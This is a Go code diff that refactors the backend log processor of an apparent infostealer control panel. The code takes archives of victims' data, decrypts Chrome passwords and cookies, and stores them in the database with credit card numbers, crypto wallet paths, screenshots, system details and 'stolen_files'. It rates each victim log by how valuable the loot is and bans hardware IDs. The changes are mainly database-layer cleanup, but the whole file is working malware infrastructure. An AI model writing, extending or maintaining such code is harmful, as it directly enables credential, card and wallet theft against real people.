@@ -18,13 +18,12 @@ import (
 )
 
 type LogProcessor struct {
-	db       *sql.DB
-	hub      Broadcaster
-	provider db.ProviderType
+	db  *sql.DB
+	hub Broadcaster
 }
 
-func NewLogProcessor(dbConn *sql.DB, hub Broadcaster, provider db.ProviderType) *LogProcessor {
-	return &LogProcessor{db: dbConn, hub: hub, provider: provider}
+func NewLogProcessor(dbConn *sql.DB, hub Broadcaster) *LogProcessor {
+	return &LogProcessor{db: dbConn, hub: hub}
 }
 
 func isValidPath(name string) bool {
@@ -88,7 +87,7 @@ func parsePasswordLine(line string, masterKey []byte) (url, username, password s
 	pass := parts[2]
 	if masterKey != nil && len(pass) >= 3 && (pass[:3] == "v10" || pass[:3] == "v11") {
 		if decrypted, err := DecryptChromeValue([]byte(pass), masterKey); err == nil {
-		pass = string(decrypted)
+			pass = string(decrypted)
 		}
 	}
 	return parts[0], parts[1], pass, true
@@ -105,7 +104,7 @@ func parseCookieLine(line string, masterKey []byte) (domain, name, value, path s
 	value = parts[5]
 	if masterKey != nil && len(value) >= 3 && (value[:3] == "v10" || value[:3] == "v11") {
 		if decrypted, err := DecryptChromeValue([]byte(value), masterKey); err == nil {
-		value = string(decrypted)
+			value = string(decrypted)
 		}
 	}
 	return domain, name, value, path, true
@@ -143,9 +142,9 @@ const (
 	maxFileCount   = 500
 )
 
-func getSetting(db *sql.DB, key string) string {
+func getSetting(d *sql.DB, key string) string {
 	var val string
-	if err := db.QueryRow("SELECT value FROM settings WHERE key = ?", key).Scan(&val); err != nil {
+	if err := db.QueryRow(d, "SELECT value FROM settings WHERE key = ?", key).Scan(&val); err != nil {
 		return ""
 	}
 	return val
@@ -160,7 +159,7 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 
 	if hwid := meta["hwid"]; hwid != "" {
 		var banned bool
-		err := p.db.QueryRow("SELECT EXISTS(SELECT 1 FROM bans WHERE hwid = ?)", hwid).Scan(&banned)
+		err := db.QueryRow(p.db, "SELECT EXISTS(SELECT 1 FROM bans WHERE hwid = ?)", hwid).Scan(&banned)
 		if err == nil && banned {
 			return "", errors.New("hwid is banned")
 		}
@@ -203,10 +202,10 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 		Path   string
 	}
 	type cardEntry struct {
-		Number  string
+		Number   string
 		ExpMonth string
-		ExpYear string
-		Holder  string
+		ExpYear  string
+		Holder   string
 	}
 	type walletEntry struct {
 		Name string
@@ -328,17 +327,17 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 				Name: walletName,
 				Path: f.Name,
 			})
-	case strings.EqualFold(name, "screenshot.bmp") && filepath.Dir(f.Name) == ".":
-		buf := new(bytes.Buffer)
-		buf.ReadFrom(rc)
-		data := buf.Bytes()
-		w, h, _, _ := parseBMPHeader(data)
-		screenshotBytes = data
-		screenshotW, screenshotH = w, h
-	case strings.EqualFold(name, "system_info.txt"):
-		buf := new(bytes.Buffer)
-		buf.ReadFrom(rc)
-		systemInfoContent = buf.String()
+		case strings.EqualFold(name, "screenshot.bmp") && filepath.Dir(f.Name) == ".":
+			buf := new(bytes.Buffer)
+			buf.ReadFrom(rc)
+			data := buf.Bytes()
+			w, h, _, _ := parseBMPHeader(data)
+			screenshotBytes = data
+			screenshotW, screenshotH = w, h
+		case strings.EqualFold(name, "system_info.txt"):
+			buf := new(bytes.Buffer)
+			buf.ReadFrom(rc)
+			systemInfoContent = buf.String()
 
 		default:
 			buf := new(bytes.Buffer)
@@ -353,12 +352,24 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 
 	// Compute quality score
 	qualityScore := 0
-	if len(passwords) > 0 { qualityScore += 30 }
-	if len(cookies) > 0 { qualityScore += 20 }
-	if len(wallets) > 0 { qualityScore += 20 }
-	if len(cards) > 0 { qualityScore += 10 }
-	if len(files) > 0 { qualityScore += 10 }
-	if systemInfoContent != "" { qualityScore += 10 }
+	if len(passwords) > 0 {
+		qualityScore += 30
+	}
+	if len(cookies) > 0 {
+		qualityScore += 20
+	}
+	if len(wallets) > 0 {
+		qualityScore += 20
+	}
+	if len(cards) > 0 {
+		qualityScore += 10
+	}
+	if len(files) > 0 {
+		qualityScore += 10
+	}
+	if systemInfoContent != "" {
+		qualityScore += 10
+	}
 
 	sessionID := uuid.New().String()
 
@@ -377,8 +388,8 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 	}
 	defer tx.Rollback()
 
-	insertSessions := db.Placeholders(p.provider, `INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, owner_id, quality_score, created_at)
-		VALUES (?, '', ?, ?, ?, ?, ?, ?, ?, `+db.Now(p.provider)+`)`)
+	insertSessions := db.Placeholders(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, owner_id, quality_score, created_at)
+		VALUES (?, '', ?, ?, ?, ?, ?, ?, ?, ` + db.Now() + `)`)
 	_, err = tx.Exec(insertSessions,
 		sessionID, meta["hwid"], meta["os"], meta["username"], meta["ip"], meta["country"], ownerID, qualityScore)
 	if err != nil {
@@ -396,14 +407,14 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 			return "", err
 		}
 		if _, err := tx.Exec(
-			`INSERT INTO screenshots (id, session_id, file_path, mime_type, size_bytes, width, height)
-			 VALUES (?, ?, ?, 'image/bmp', ?, ?, ?)
-			 ON CONFLICT(session_id) DO UPDATE SET
-			   file_path=excluded.file_path,
-			   size_bytes=excluded.size_bytes,
-			   width=excluded.width,
-			   height=excluded.height,
-			   created_at=CURRENT_TIMESTAMP`,
+			db.Placeholders(`INSERT INTO screenshots (id, session_id, file_path, mime_type, size_bytes, width, height)
+                 VALUES (?, ?, ?, 'image/bmp', ?, ?, ?)
+                 ON CONFLICT(session_id) DO UPDATE SET
+                   file_path=excluded.file_path,
+                   size_bytes=excluded.size_bytes,
+                   width=excluded.width,
+                   height=excluded.height,
+                   created_at=CURRENT_TIMESTAMP`),
 			id, sessionID, path, len(screenshotBytes), screenshotW, screenshotH,
 		); err != nil {
 			return "", err
@@ -411,7 +422,7 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 	}
 
 	if len(passwords) > 0 {
-		stmt, err := tx.Prepare(`INSERT INTO passwords (id, session_id, url, username, password_value, browser) VALUES (?, ?, ?, ?, ?, ?)`)
+		stmt, err := tx.Prepare(db.Placeholders(`INSERT INTO passwords (id, session_id, url, username, password_value, browser) VALUES (?, ?, ?, ?, ?, ?)`))
 		if err != nil {
 			return "", err
 		}
@@ -424,7 +435,7 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 	}
 
 	if len(cookies) > 0 {
-		stmt, err := tx.Prepare(`INSERT INTO cookies (id, session_id, domain, name, value, path) VALUES (?, ?, ?, ?, ?, ?)`)
+		stmt, err := tx.Prepare(db.Placeholders(`INSERT INTO cookies (id, session_id, domain, name, value, path) VALUES (?, ?, ?, ?, ?, ?)`))
 		if err != nil {
 			return "", err
 		}
@@ -437,7 +448,7 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 	}
 
 	if len(cards) > 0 {
-		stmt, err := tx.Prepare(`INSERT INTO cards (id, session_id, number, exp_month, exp_year, holder) VALUES (?, ?, ?, ?, ?, ?)`)
+		stmt, err := tx.Prepare(db.Placeholders(`INSERT INTO cards (id, session_id, number, exp_month, exp_year, holder) VALUES (?, ?, ?, ?, ?, ?)`))
 		if err != nil {
 			return "", err
 		}
@@ -450,7 +461,7 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 	}
 
 	if len(wallets) > 0 {
-		stmt, err := tx.Prepare(`INSERT INTO wallets (id, session_id, name, path) VALUES (?, ?, ?, ?)`)
+		stmt, err := tx.Prepare(db.Placeholders(`INSERT INTO wallets (id, session_id, name, path) VALUES (?, ?, ?, ?)`))
 		if err != nil {
 			return "", err
 		}
@@ -463,7 +474,7 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 	}
 
 	if len(files) > 0 {
-		stmt, err := tx.Prepare(`INSERT INTO stolen_files (id, session_id, filename, size) VALUES (?, ?, ?, ?)`)
+		stmt, err := tx.Prepare(db.Placeholders(`INSERT INTO stolen_files (id, session_id, filename, size) VALUES (?, ?, ?, ?)`))
 		if err != nil {
 			return "", err
 		}
@@ -486,24 +497,23 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 			info["mac"], info["public_ip"], info["hwid"], info["uptime"],
 			ua,
 		}
-		var q string
-		if p.provider == db.ProviderPostgres {
-			placeholders := make([]string, len(values))
-			for i := range placeholders { placeholders[i] = fmt.Sprintf("$%d", i+1) }
-			setClauses := make([]string, len(systemCols))
-			for i, c := range systemCols {
-				setClauses[i] = fmt.Sprintf("%s = EXCLUDED.%s", c, c)
-			}
-			q = fmt.Sprintf(`INSERT INTO system_info (session_id, %s) VALUES (%s)
-				ON CONFLICT (session_id) DO UPDATE SET %s`,
-				strings.Join(systemCols, ", "),
-				strings.Join(placeholders, ", "),
-				strings.Join(setClauses, ", "),
-			)
-		} else {
-			q = `INSERT OR REPLACE INTO system_info (session_id, cpu, gpu, ram, os, screen, hostname, local_ip, mac, public_ip, hwid, uptime, user_agent)
-				VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
-		}
+		q := fmt.Sprintf(`INSERT INTO system_info (session_id, %s) VALUES (%s)
+		ON CONFLICT (session_id) DO UPDATE SET %s`,
+			strings.Join(systemCols, ", "),
+			strings.Join(func() []string {
+				placeholders := make([]string, len(values))
+				for i := range placeholders {
+					placeholders[i] = fmt.Sprintf("$%d", i+1)
+				}
+				return placeholders
+			}(), ", "),
+			strings.Join(func() []string {
+				setClauses := make([]string, len(systemCols))
+				for i, c := range systemCols {
+					setClauses[i] = fmt.Sprintf("%s = EXCLUDED.%s", c, c)
+				}
+				return setClauses
+			}(), ", "))
 		if _, err = tx.Exec(q, values...); err != nil {
 			return "", err
 		}
